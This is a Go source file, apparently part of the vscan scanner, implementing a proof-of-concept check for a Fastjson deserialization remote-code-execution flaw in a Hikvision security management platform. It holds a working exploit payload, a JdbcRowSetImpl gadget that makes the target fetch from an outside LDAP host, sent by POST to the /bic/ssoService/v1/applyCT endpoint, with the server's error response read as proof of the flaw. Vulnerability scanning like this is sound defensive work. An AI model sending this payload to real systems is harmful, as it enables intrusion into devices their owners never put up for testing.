package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func HIKVISION_ZHAFGL_Fastjson_RCE_nodns(u string) bool {

	PocData := "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://kjvqweuoav.dnstunnel.run\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}"
	header := make(map[string]string)
	header["Accept-Encoding"] = "gzip, deflate"
	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
	header["Accept-Language"] = "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
	header["Dnt"] = "1"
	header["Upgrade-Insecure-Requests"] = "1"
	header["Sec-Fetch-Dest"] = "document"
	header["Sec-Fetch-Mode"] = "navigate"
	header["Sec-Fetch-Site"] = "cross-site"
	header["Sec-Fetch-User"] = "?1"
	header["Content-Type"] = "application/json"
	header["Te"] = "trailers"
	if req, err := pkg.HttpRequset(u+"/bic/ssoService/v1/applyCT", "POST", PocData, false, header); err == nil {
		if req.StatusCode == 500 && strings.Contains(req.Body, "code") && strings.Contains(req.Body, "msg") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln HIKVISION_ZHAFGL_Fastjson_RCE_nodns!|%s\n", u+"/bic/ssoService/v1/applyCT"))
			return true

		}
	}
	return false
}
